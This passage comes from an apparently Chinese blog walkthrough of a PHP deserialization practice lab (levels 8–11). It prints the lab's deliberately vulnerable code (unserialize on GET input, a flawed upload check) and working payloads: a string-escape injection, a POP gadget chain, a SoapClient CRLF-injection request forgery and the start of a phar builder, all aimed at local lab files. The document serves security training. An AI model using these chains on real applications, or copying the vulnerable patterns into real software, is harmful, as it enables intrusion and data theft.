class="hljs-variable">$profile</span>);<br>var_dump(<span class="hljs-variable">$profile</span>-&gt;pass==<span class="hljs-string">&#x27;escaping&#x27;</span>);<span class="hljs-comment">// 要求$pass==escaping，但$pass的值又无法更改</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$profile</span>-&gt;pass==<span class="hljs-string">&#x27;escaping&#x27;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这关是增逃逸</p><p>简单点说就是利用序列化字符串的格式以及<code>filter()</code>来实现满足程序或代码的要求</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 举个例子</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$act</span>=<span class="hljs-string">&#x27;111&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> a;<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$b</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">// 输出:O:1:&quot;a&quot;:1:&#123;s:3:&quot;act&quot;;s:3:&quot;111&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/9.png"></p><p>在进行反序列化时，<code>unserialize()</code>是根据这些字符的特殊含义去进行反序列化，假如把<strong>代表属性值长度的字符串更改为变大或者变小的</strong>或是<strong>将属性值进行增长或缩短</strong>，那么就可以实现<strong>增逃逸</strong>或<strong>减逃逸</strong></p><p>回到题目，<code>filter()</code>函数将<code>flag</code>或<code>php</code>更改为<code>hack</code>，因为<code>flag</code>和<code>hack</code>长度相同，所以这里选用<code>php</code>进行增逃逸(因为<code>php</code>变成<code>hack</code>时长度增加1)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$user</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;daydream&#x27;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$user</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;user=<span class="hljs-variable">$user</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> test(<span class="hljs-string">&#x27;x&#x27;</span>);<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-comment">// 输出:O:4:&quot;test&quot;:2:&#123;s:4:&quot;user&quot;;s:1:&quot;x&quot;;s:4:&quot;pass&quot;;s:8:&quot;daydream&quot;;&#125;</span><br><span class="hljs-comment">// 吃掉  &quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;  替换为&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;      该段长度为29</span><br><span class="hljs-comment">// 也就是需要将x更改为29个php再加上&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;</span><br><br><span class="hljs-comment"># 更改代码为</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$user</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;daydream&#x27;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$user</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;user=<span class="hljs-variable">$user</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$flag</span> = <span class="hljs-keyword">new</span> test(<span class="hljs-string">&#x27;phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;&#x27;</span>);<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$flag</span>);<br><span class="hljs-comment">// 输出 O:4:&quot;test&quot;:2:&#123;s:4:&quot;user&quot;;s:116:&quot;phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;&quot;;s:4:&quot;pass&quot;;s:8:&quot;daydream&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/10.png"></p><h4 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h4><p>这关就开始构造pop链了，先看一下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag is in flag.php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)      // 该函数为最后一步</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<span class="hljs-comment">// 包含flag.php文件，$value也就是flag.php</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<span class="hljs-comment">// 打印flag，最终目的</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;     <span class="hljs-comment">// 当尝试将对象调用为函数时触发，需要$var = flag.php   倒数第二步</span><br>        <span class="hljs-keyword">$this</span>-&gt;append(<span class="hljs-keyword">$this</span>-&gt;var);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment">// 倒数第四步，把类当作字符串使用时触发  </span><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;str-&gt;source;<span class="hljs-comment">// 若$str为类Test实例化的对象，而$source为一个不可访问的属性，则调用__get()</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment">// 反序列化的入口</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;source;<span class="hljs-comment">// 若$source为一个对象时，则调用__toString()</span><br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<span class="hljs-comment">// 用于从不可访问的属性读取数据或者不存在这个键都会调用此方法  </span><br>        <span class="hljs-variable">$function</span> = <span class="hljs-keyword">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<span class="hljs-comment">// 若$function = class Modifier,则触发__invoke()倒数第三步</span><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]))&#123;    <span class="hljs-comment">// 检测是否为空</span><br>    unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ok，分析完了，捋一下思路</p><ol><li><code>__wake()</code>作为入口，去调用<code>__toString()</code>：要求<code>$source</code>为类<code>Show</code>实例化后的对象</li><li><code>__toString()</code>作为第二步，去调用<code>__get()</code>：要求<code>$str</code>为类<code>Test</code>实例化的对象，而<code>$source</code>为一个不可访问的属性</li><li><code>__get($key)</code>作为第三步，去调用<code>__invoke()</code>：<code>$function</code>也就是<code>public $p</code>为类<code>Modifier</code>实例化后的对象</li><li><code>__invoke()</code>作为第四步，去调用<code>append()</code>:要求<code>private $var;</code>的值为<code>flag.php</code></li><li><code>append()</code>作为最后一步，打印出<code>flag</code></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$var</span> = <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)      // 需要$<span class="hljs-title">value</span> = <span class="hljs-title">flag</span>.<span class="hljs-title">php</span> 最后一步</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;     <span class="hljs-comment">// 需要$var = flag.php   倒数第二步,当类被当做函数执行时</span><br>        <span class="hljs-keyword">$this</span>-&gt;append(<span class="hljs-keyword">$this</span>-&gt;var);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;   <span class="hljs-comment">// 对象当做字符串执行时</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;str-&gt;source;  <span class="hljs-comment">// 进入Test对象中,因为类中没有source这个属性，所以会进入__get()中寻找是否有其他属性</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;     <span class="hljs-comment">// 反序列化时优先调用</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;source;         <span class="hljs-comment">// 调用__toString()</span><br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;    <span class="hljs-comment">// 在对象的外部获取私有成员属性的值时执行</span><br>        <span class="hljs-variable">$function</span> = <span class="hljs-keyword">$this</span>-&gt;p;       <span class="hljs-comment">//</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();         <span class="hljs-comment">// 调用__invoke()</span><br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> Modifier();<span class="hljs-comment">// 先实例化三个类</span><br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> Show();<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> Test();<br><br><span class="hljs-variable">$b</span>-&gt;source = <span class="hljs-variable">$b</span>;<span class="hljs-comment">// 调用__toString()</span><br><span class="hljs-variable">$b</span>-&gt;str = <span class="hljs-variable">$c</span>;<span class="hljs-comment">// 调用__get()</span><br><span class="hljs-variable">$c</span>-&gt;p = <span class="hljs-variable">$a</span>;<span class="hljs-comment">// 调用__invoke()这部可以放在第一步进行赋值操作</span><br><br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$b</span>);<br><span class="hljs-comment">// 输出：O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;r:1;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;O:8:&quot;Modifier&quot;:1:&#123;s:13:&quot; Modifier var&quot;;N;&#125;&#125;&#125;</span><br><span class="hljs-comment">// 注意私有变量的不可以见字符</span><br><span class="hljs-comment">// 更改为如下形式：O:4:\&quot;Show\&quot;:2:&#123;s:6:\&quot;source\&quot;;r:1;s:3:\&quot;str\&quot;;O:4:\&quot;Test\&quot;:1:&#123;s:1:\&quot;p\&quot;;O:8:\&quot;Modifier\&quot;:1:&#123;s:13:\&quot;\00Modifier\00var\&quot;;s:8:\&quot;flag.php\&quot;;&#125;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/11.png"></p><h4 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$c</span> = unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param&#x27;</span>]);<br><span class="hljs-variable">$c</span> -&gt; daydream();<span class="hljs-comment">// 调用的是原生类中基本不存在的方法，去执行__call()</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">In this topic,it is of course possible to pass parameters directly to flag.php, but it is not recommended to use this method to learn SOAP.</span><br><span class="hljs-comment">flag.php</span><br><span class="hljs-comment">$flag=&quot;*&quot;;</span><br><span class="hljs-comment">$user=$_SERVER[&#x27;HTTP_USER_AGENT&#x27;];</span><br><span class="hljs-comment">$pass = $_POST[&#x27;pass&#x27;];</span><br><span class="hljs-comment">if(isset($pass) and isset($user))&#123;</span><br><span class="hljs-comment">if($pass==&#x27;password&#x27; and $user==&#x27;admin&#x27;)&#123;</span><br><span class="hljs-comment">file_put_contents(&#x27;flag.txt&#x27;,$flag);</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>看题目提示，这关是<code>PHP</code>原生类的反序列化</p><p>利用<code>SoapClient</code>这个原生类，在调用原生类中不存在的方法时，会转而执行<code>__call()</code></p><p>然后再配合上CRLF注入去最终实现<code>flag.php</code>文件的正常执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$user_agent</span> = <span class="hljs-string">&quot;admin&quot;</span>;<br><span class="hljs-variable">$post</span> = <span class="hljs-string">&quot;pass=password&quot;</span>;<br><br><span class="hljs-variable">$f</span> = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-literal">null</span>, <span class="hljs-keyword">array</span>(<br><span class="hljs-comment">#    &#x27;location&#x27; =&gt; &#x27;http://127.0.0.1:9999&#x27;,</span><br>    <span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-string">&#x27;http://127.0.0.1/php/level10/flag.php&#x27;</span>,<span class="hljs-comment">// 设定访问地址</span><br>    <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; <span class="hljs-string">&#x27;mechoy&#x27;</span>,<br>    <span class="hljs-string">&#x27;user_agent&#x27;</span>=&gt; <span class="hljs-variable">$user_agent</span> . <span class="hljs-string">&quot;\r\nContent-Type: application/x-www-form-urlencoded&quot;</span> . <span class="hljs-string">&quot;\r\nContent-Length:&quot;</span> . (<span class="hljs-keyword">string</span>)strlen(<span class="hljs-variable">$post</span>) . <span class="hljs-string">&quot;\r\n\r\n&quot;</span> . <span class="hljs-variable">$post</span>,<br>    ));<span class="hljs-comment">// Content-Type: application/x-www-form-urlencoded，这个头必须要有，因为发送的是post数据包</span><br><br><span class="hljs-variable">$a</span> =  serialize(<span class="hljs-variable">$f</span>);<br><span class="hljs-keyword">echo</span> urlencode(<span class="hljs-variable">$a</span>);<br><span class="hljs-comment">/*输出:</span><br><span class="hljs-comment">O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A6%3A%22mechoy%22%3Bs%3A8%3A%22location%22%3Bs%3A37%3A%22http%3A%2F%2F127.0.0.1%2Fphp%2Flevel10%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A90%3A%22admin%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A13%0D%0A%0D%0Apass%3Dpassword%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span><br></code></pre></td></tr></table></figure><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/12.png"></p><h4 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># index.php</span><br><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$filename</span>))&#123;<br><span class="hljs-keyword">echo</span> md5_file(<span class="hljs-variable">$filename</span>);<br>&#125;<br><span class="hljs-comment">//upload.php</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># upload.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$allowedExs</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;jpeg&quot;</span>,<span class="hljs-string">&quot;jpg&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>);<br><span class="hljs-variable">$temp</span>=explode(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);<br><span class="hljs-variable">$extension</span>=end(<span class="hljs-variable">$temp</span>);<br><span class="hljs-keyword">if</span> ((<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>])==<span class="hljs-string">&quot;image/gif&quot;</span><br>    ||(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>])==<span class="hljs-string">&quot;image/jpeg&quot;</span><br>    ||(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>])==<span class="hljs-string">&quot;image/jpg&quot;</span><br>    ||(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>])==<span class="hljs-string">&quot;image/pjpeg&quot;</span><br>    ||(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>])==<span class="hljs-string">&quot;image/x-png&quot;</span><br>    ||(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>])==<span class="hljs-string">&quot;image/png&quot;</span><br>    &amp;&amp;(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;size&quot;</span>])&lt;<span class="hljs-number">204800</span><br>    &amp;&amp;in_array(<span class="hljs-variable">$extension</span>,<span class="hljs-variable">$allowedExs</span>))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>]&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;错误：&quot;</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>].<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        move_uploaded_file(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>],<span class="hljs-string">&quot;upload/&quot;</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件储存在&quot;</span>.<span class="hljs-string">&quot;upload/&quot;</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>        &#125;<br>    &#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;mybe hack?&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>先在level11目录下创建一个upload文件夹，用于上传文件</p><p>用如下代码生成一个<code>phar</code>文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;1.phar&quot;</span>); <span class="hljs-comment">//后缀名必须为phar</span><br><span class="hljs-variable">$phar</span>-&gt;startBuffering();<br><span class="hljs-variable">$phar</span>-&gt;setStub(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub</span><br><span class="hljs-variable">$o</span> = <span 